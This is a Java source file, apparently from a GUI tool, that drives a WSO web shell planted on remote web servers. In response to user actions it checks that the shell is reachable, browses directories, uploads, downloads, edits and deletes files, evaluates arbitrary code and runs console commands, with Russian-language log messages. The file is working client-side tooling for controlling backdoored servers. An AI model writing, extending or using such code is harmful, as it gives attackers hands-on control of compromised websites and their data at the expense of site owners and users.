package base;

import java.util.ArrayList;
import struct.*;

public class WebWSO extends Thread {

    public static String url;
    public int action = 0;
    public String code;
    public String dir;
    public static String edit_dir;
    public String file;
    public static String edit_file;
    public static boolean finish = true;

    public static ArrayList<OneFile> folders;
    public static ArrayList<OneFile> files;
    //////////////

    public void run() {
        try {
            WSO wso = new WSO();
            switch (action) {
                case 0:
                    if (!finish) {
                        return;
                    }

                    finish = !true;
                    boolean wso_start = false;
                    Helper.log("Чекаю шелл");
                    wso_start = wso.start();

                    folders = wso.folders;
                    files = wso.files;

                    finish = !false;
                    if (wso.cloudflare) {
                        Helper.log("Ругается cloudflare!");
                    }

                    break;
                case 1:
                    if (!finish) {
                        return;
                    }

                    finish = false;
                    Helper.log("Меняем директорию на " + dir);
                    wso.chdir(dir);
                    folders = wso.folders;
                    files = wso.files;

                    finish = true;
                    break;
                case 2:
                    if (!finish) {
                        return;
                    }

                    finish = false;
                    wso.view(file);
                    finish = true;
                    break;
                case 3:
                    if (!finish) {
                        return;
                    }

                    finish = false;
                    wso.upload(file);
                    wso.chdir(dir);
                    folders = wso.folders;
                    files = wso.files;
                    Helper.log("Загружен файл " + file);
                    finish = true;
                    break;
                case 4:
                    if (!finish) {
                        return;
                    }

                    finish = false;
                    wso.delete_folder(dir);
                    wso.chdir(Base.wso_frame.folder_field.getText());
                    folders = wso.folders;
                    files = wso.files;
                    Helper.log("Удалена директория " + dir);
                    finish = true;
                    break;
                case 5:
                    if (!finish) {
                        return;
                    }

                    finish = false;
                    wso.delete_file(file);
                    wso.chdir(Base.wso_frame.folder_field.getText());
                    folders = wso.folders;
                    files = wso.files;
                    Helper.log("Удален файл " + file);
                    finish = true;
                    break;
                case 6:
                    if (!finish) {
                        return;
                    }

                    finish = false;
                    wso.download(file);
                    Helper.log("Скачан файл " + file);
                    finish = true;
                    break;
                case 7:
                    if (!finish) {
                        return;
                    }

                    finish = false;
                    wso.edit(file);
                    Helper.log("Редактируем файл " + file);
                    edit_dir = Base.wso_frame.folder_field.getText();
                    edit_file = file;

                    finish = true;
                    break;
                case 8:
                    if (!finish) {
                        return;
                    }
                    //save edited
                    finish = false;
                    wso.save();
                    Helper.log("Файл успешно сохранен!");
                    finish = true;
                    break;
                case 9:
                    if (!finish) {
                        return;
                    }
                    //save edited
                    finish = false;
                    wso.eval(code);
                    Helper.log("Код выполнен успешно!");
                    Base.wso_frame.eval_result.setText(wso.otvet);
                    finish = true;
                    break;
                case 10:
                    if (!finish) {
                        return;
                    }
                    //save edited
                    finish = false;
                    wso.cmd(code);
                    Helper.log("Консольная команда успешно выполнена!");
                    Base.wso_frame.console_cmd.setText("");
                    Base.wso_frame.console_output.setText(wso.otvet);
                    finish = true;
                    break;
            };
        } catch (Exception ex) {
            ex.printStackTrace();
            finish = true;
        }

    }

}
